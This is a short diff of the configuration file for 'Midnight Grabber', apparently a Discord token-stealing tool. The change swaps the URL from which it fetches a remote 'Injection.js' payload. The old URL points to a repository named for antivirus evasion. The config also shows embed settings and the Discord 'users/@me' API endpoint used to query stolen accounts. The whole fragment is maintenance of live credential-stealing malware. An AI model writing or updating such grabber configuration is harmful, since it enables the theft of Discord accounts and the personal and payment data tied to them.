@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Midnight Grabber | https://guns.lol/247msn', 
   embed_icon: 'https://imgur.com/81575b78-e93d-444c-b60f-c389c3f47573', 
   embed_color: 0, 
-  injection_url: 'https://raw.githubusercontent.com//antivirusevasion23/main/injection/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/Injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
